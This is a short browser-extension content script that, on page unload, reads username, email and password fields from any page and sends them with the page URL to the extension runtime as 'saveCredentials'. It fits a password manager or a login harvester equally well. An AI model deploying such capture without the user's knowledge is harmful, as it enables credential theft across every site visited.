const idFieldNames = ["id", "Id", "ID", "user", "User", "USER", "email", "Email", "EMAIL"];
const pwFieldNames = ["password", "Password", "PASSWORD", "pw", "Pw", "PW"];

// check input field right before page unload
window.addEventListener('beforeunload', function (event) {
  const inputFields = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]');
  const credential = {
    url: window.location.href,
    username: "",
    password: "",
  }

  inputFields.forEach(function (field) {
    // if field name or id contains one of idFieldNames or pwFieldNames
    if (idFieldNames.some(function (name) { return field.id.includes(name)})) {
      credential.username = field.value;
    }
    if (pwFieldNames.some(function (name) { return field.id.includes(name)})) {
      credential.password = field.value;
    }
  });
  
  // send credential data to chrome runtime
  if(credential.username !== "" && credential.password !== "") {
    chrome.runtime.sendMessage({ action: "saveCredentials", credentials: credential });
  }
});

